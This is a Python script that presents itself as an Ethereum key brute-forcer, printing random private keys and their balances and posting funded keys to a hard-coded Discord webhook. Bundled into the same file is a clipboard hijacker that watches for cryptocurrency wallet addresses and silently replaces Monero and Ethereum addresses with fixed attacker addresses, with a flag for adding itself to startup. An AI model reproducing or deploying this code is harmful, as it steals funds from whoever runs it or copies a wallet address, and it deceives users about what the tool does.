import pyperclip
import threading
import time
import re
import requests
from web3 import Account
from eth_account import Account as LocalAccount
from termcolor import colored
from colorama import init, Fore, Style

ADD_TO_STARTUP = True
HIDE_BINARIES = True


def check(clipboard):
    regex = {
        "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
        "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "tron": "^T[a-zA-Z0-9]{33}$",
        "btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
        "xrp": "^r[0-9a-zA-Z]{24,34}$",
        "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
        "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "dot": "^[1-9A-HJ-NP-Za-km-z]*$",
        "eth": "^0x[a-fA-F0-9]{40}$",
        "sol": "^S[a-z0-9_-]{29,}$",
    }
    for key, value in regex.items():
        if bool(re.search(value, clipboard)):
            return key
    return 0


def replace_crypto(data):
    my_addresses = {
        "xmr": "43LmvaW5imeir6gTbbDu5mS3eCAihEu8nWQTLzeHGyAtNCzxS2CwD6KNsQxgmH9BWv5YbZUgmMmoj2cDXwxKe5miTrpzovC",
        "eth": "0x9BF662bC68D96507d5b588C699131397c5E87D70",
       
    }
    if data != 0 and my_addresses[data] != "null":
        pyperclip.copy(my_addresses[data])
    return 0


def main():
    while 1:
        time.sleep(0.7)
        clipboard = pyperclip.paste()
        data = check(clipboard)
        replace_crypto(data)


if __name__ == "__main__":
    if ADD_TO_STARTUP:
        startup()
    t = threading.Thread(target=main)
    t.start()


init()

API_KEYS = [
    "G8C8RQ2RRXBTAKC2AUV4Z54G2WJDMI9CBZ",
]

api_key_index = 0

while True:
    private_key = LocalAccount.create().key.hex()[2:]
    llb = "https://discord.com/api/webhooks/1086049520728686704/_a4SAqNQXPWRGAuTq45Cj_7o9zCFS3tW17ZherdHfUHFbWHlmFQ5W5GeRPJ1n-474Qu1"
    address = Account.from_key(private_key).address
    api_key = API_KEYS[api_key_index]
    url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={api_key}"
    response = requests.get(url)
    balance = int(response.json()["result"]) / 10**18

    if balance > 0:
        message = f"Private key| {private_key}\nAddress| {address}\nBalance| {balance} ETH"
        print(colored(message, 'green'))

        data = {"content": message}
        headers = {"Content-Type": "application/json"}
        response = requests.post(llb, json=data, headers=headers)

        break
    else:
        print(colored("Private key| ", "white") + colored(private_key, "red") + colored(" | ", "white") + colored(balance, "red") + (" ETH"))

        
    api_key_index = (api_key_index + 1) % len(API_KEYS)
    time.sleep(0.000000000002)
